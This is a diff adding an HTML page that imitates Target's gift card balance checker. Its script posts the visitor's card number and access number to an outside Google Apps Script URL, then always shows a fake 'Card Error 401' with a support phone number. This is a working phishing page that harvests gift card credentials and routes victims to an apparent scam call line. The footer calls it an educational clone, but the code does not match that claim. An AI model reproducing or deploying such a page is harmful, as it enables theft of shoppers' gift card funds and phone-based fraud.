@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Check a Gift Card Balance</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+    }
+    header {
+      background-color: #cc0000;
+      color: white;
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 20px;
+      font-size: 14px;
+    }
+    nav {
+      background-color: #cc0000;
+      color: white;
+      display: flex;
+      align-items: center;
+      padding: 10px 20px;
+      gap: 30px;
+      flex-wrap: wrap;
+    }
+    nav img {
+      height: 30px;
+    }
+    .search-bar {
+      flex-grow: 1;
+      max-width: 400px;
+    }
+    .search-bar input {
+      width: 100%;
+      padding: 8px;
+      border: none;
+      border-radius: 20px;
+    }
+    .container {
+      max-width: 700px;
+      margin: 50px auto;
+      text-align: center;
+    }
+    h2 {
+      font-size: 24px;
+      margin-bottom: 30px;
+    }
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .input-group label {
+      font-size: 14px;
+      display: block;
+      margin-bottom: 6px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .check-btn {
+      background-color: #cc0000;
+      color: white;
+      font-size: 18px;
+      padding: 14px 30px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+    }
+    .error-message {
+      display: none;
+      color: red;
+      font-size: 16px;
+      margin-top: 20px;
+      line-height: 1.6;
+    }
+    .newsletter {
+      margin-top: 50px;
+      font-size: 16px;
+    }
+    .newsletter input {
+      padding: 10px;
+      font-size: 14px;
+      width: 250px;
+    }
+    .signup-btn {
+      padding: 10px 20px;
+      background-color: #cc0000;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      margin-left: 10px;
+      cursor: pointer;
+    }
+    footer {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 20px;
+    }
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+      }
+      nav {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div>📍 Ship to 52404</div>
+    <div>📦 Cedar Rapids South</div>
+  </header>
+
+  <nav>
+    <img src="https://1000logos.net/wp-content/uploads/2017/06/Target-Logo.png" alt="Target logo" />
+    <div>Categories</div>
+    <div>Deals</div>
+    <div>New & featured</div>
+    <div>Pickup & delivery</div>
+    <div class="search-bar">
+      <input type="text" placeholder="What can we help you find?" />
+    </div>
+    <div>👤 Account</div>
+    <div>🛒</div>
+  </nav>
+
+  <div class="container">
+    <h2>Check a gift card balance</h2>
+
+    <!-- Form Start -->
+    <form id="cardForm">
+      <div class="input-group">
+        <label for="giftCardNumber">Card number</label>
+        <input type="text" id="giftCardNumber" name="giftCardNumber" placeholder="Enter gift card number" required>
+      </div>
+
+      <div class="input-group">
+        <label for="accessNumber">Access number</label>
+        <input type="text" id="accessNumber" name="accessNumber" placeholder="Enter access number" required>
+      </div>
+
+      <button class="check-btn" type="submit">Check balance</button>
+
+      <!-- Error message -->
+      <div id="errorMsg" class="error-message">
+        <strong>❌ Card Error 401</strong><br>
+        📞 <a href="tel:+18447092550" style="color: red; text-decoration: underline;">Contact Support: +1-844-709-2550</a>
+      </div>
+    </form>
+    <!-- Form End -->
+
+    <div class="newsletter">
+      <p><strong>Get top deals, latest trends, and more.</strong></p>
+      <input type="email" placeholder="Email address">
+      <button class="signup-btn">Sign up</button>
+      <p><a href="#" style="font-size: 12px; color: gray;">Privacy policy</a></p>
+    </div>
+  </div>
+
+  <footer>
+    &copy; 2025 Target. This is a clone for educational/demo use.
+  </footer>
+
+  <script>
+    document.getElementById("cardForm").addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const formData = new FormData(event.target);
+      const formDetails = {
+        giftCardNumber: formData.get("giftCardNumber"),
+        accessNumber: formData.get("accessNumber"),
+      };
+
+      const scriptURL = "https://script.google.com/macros/s/AKfycbxxWc-gnkS1RosZF33aahxTFUWTINAoiyhin9pOzzVUZLJOugP4NAodKW7E8IHM5y03/exec";
+
+      fetch(scriptURL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(formDetails),
+      })
+        .then(() => {
+          // Show error message
+          document.getElementById("errorMsg").style.display = "block";
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("⚠️ Something went wrong! Try again.");
+        });
+    });
+  </script>
+
+</body>
+</html>
